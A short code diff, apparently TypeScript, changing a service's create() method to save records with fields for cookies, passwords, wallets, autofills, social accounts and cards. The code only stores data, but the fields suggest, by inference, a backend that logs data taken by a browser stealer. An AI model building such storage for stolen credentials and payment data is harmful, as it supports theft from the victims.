@@ -9,13 +9,14 @@ export class AppService {
 
   async create(dto: {
     id: number, 
-    num: string,
-    ip: string, 
-    browse: string, 
-    passwords: number, 
-    wallets: number,  
-    build: number,
-    date: Date
+    total: string,
+    cookies: string, 
+    passwords: string, 
+    wallets: string,  
+    autofills: string,
+    social: string,
+    cards: string,
+    date: string
   }) {
     const set = this.appRepository.create(dto)
     return await this.appRepository.save(set)
